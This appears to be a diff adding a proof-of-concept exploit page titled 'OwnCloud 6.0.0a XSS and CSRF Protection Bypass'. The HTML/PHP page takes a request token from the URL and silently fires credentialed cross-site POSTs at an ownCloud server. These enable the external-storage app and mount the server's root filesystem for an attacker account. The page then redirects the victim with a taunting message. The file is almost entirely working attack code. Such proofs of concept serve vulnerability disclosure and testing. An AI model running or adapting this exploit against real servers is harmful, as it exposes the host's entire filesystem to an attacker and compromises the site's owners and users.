@@ -1,0 +1,69 @@
+&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+&lt;head&gt;
+        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+        &lt;title&gt;OwnCloud 6.0.0a XSS and CSRF Protection Bypass&lt;/title&gt;
+        &lt;script type=&quot;text/javascript&quot; src=&quot;http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;span id=&quot;container&quot;&gt;&lt;/span&gt;
+        &lt;form id=&quot;form1&quot;&gt;
+                &lt;input type=&quot;hidden&quot; name=&quot;mountPoint&quot; value=&quot;LOL&quot;&gt;
+                &lt;input type=&quot;hidden&quot; name=&quot;class&quot; value=&quot;OCFilesStorageLocal&quot;&gt;
+                &lt;input type=&quot;hidden&quot; name=&quot;classOptions[datadir]&quot; value=&quot;/&quot;&gt;
+                &lt;input type=&quot;hidden&quot; name=&quot;mountType&quot; value=&quot;user&quot;&gt;
+                &lt;input type=&quot;hidden&quot; name=&quot;applicable&quot; value=&quot;[ATTACKER]&quot;&gt;
+                &lt;input type=&quot;hidden&quot; name=&quot;isPersonal&quot; value=&quot;false&quot;&gt;
+                &lt;?php echo '&lt;input type=&quot;hidden&quot; name=&quot;requesttoken&quot; value=&quot;'.$_GET[&quot;rt&quot;].'&quot;&gt;' ?&gt;
+        &lt;/form&gt;
+    &lt;script&gt;
+        $('#form1').submit(function(event) {
+                event.preventDefault();
+                $.ajax({
+                        type: 'POST',
+                        url: 'http://www.example.com/index.php/apps/files_external/ajax/addMountPoint.php',
+                        data: $(this).serialize(),
+                xhrFields: {
+                 withCredentials: true
+                },
+                        dataType: 'json',
+                });
+        });
+        &lt;/script&gt;
+ 
+        &lt;form id=&quot;form2&quot;&gt;
+                &lt;input type=&quot;hidden&quot; name=&quot;appid&quot; value=&quot;files_external&quot;&gt;
+                &lt;?php echo '&lt;input type=&quot;hidden&quot; name=&quot;requesttoken&quot; value=&quot;'.$_GET[&quot;rt&quot;].'&quot;&gt;' ?&gt;
+        &lt;/form&gt;
+    &lt;script&gt;
+        $('#form2').submit(function(event) {
+                event.preventDefault();
+                $.ajax({
+                        type: 'POST',
+                        url: 'http://www.example.com/index.php/settings/ajax/enableapp.php',
+                        data: $(this).serialize(),
+                xhrFields: {
+                 withCredentials: true
+                },
+                        dataType: 'json',
+                });
+        });
+ 
+    function ext() {
+        $('#form2').submit();
+        $(&quot;#container&quot;).text(&quot;Enabling External Storage...&quot;);
+    };
+    function mount() {
+        $('#form1').submit();
+        $(&quot;#container&quot;).text(&quot;Mounting the root filesystem...&quot;);
+    };
+    function redirect() {
+        window.location.href = 'http://www.example.com/';
+        $(&quot;#container&quot;).text(&quot;Redirecting back home ;)&quot;);
+    };
+    setTimeout(function() {ext();}, 0);
+    setTimeout(function() {mount();}, 5000);
+    setTimeout(function() {redirect();}, 5500);
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
